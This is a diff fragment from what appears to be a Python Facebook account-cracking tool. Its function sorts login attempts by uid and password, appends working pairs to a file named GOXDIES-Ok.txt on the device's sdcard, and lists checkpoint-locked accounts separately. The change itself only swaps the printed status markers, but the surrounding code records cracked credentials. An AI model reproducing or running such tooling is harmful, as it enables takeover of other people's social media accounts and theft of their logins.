@@ -202,11 +202,11 @@ def file_subb(uid,pwx):
                 oks.append(uid)
                 break
             elif "PLEASE, CONFIRM EMAIL: " in q:
-                print(f"\r\r। [OK] {uid} | {ps}      ")
+                print(f"\r\r। [✓] {uid} | {ps}      ")
                 open("/sdcard/GOXDIES-Ok.txt","a+").write(uid+"|"+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
-                print(f"\r\r  [CP] {uid} | {ps}      ")
+                print(f"\r\r  [X] {uid} | {ps}      ")
                 cps.append(uid)
             else:
                 continue
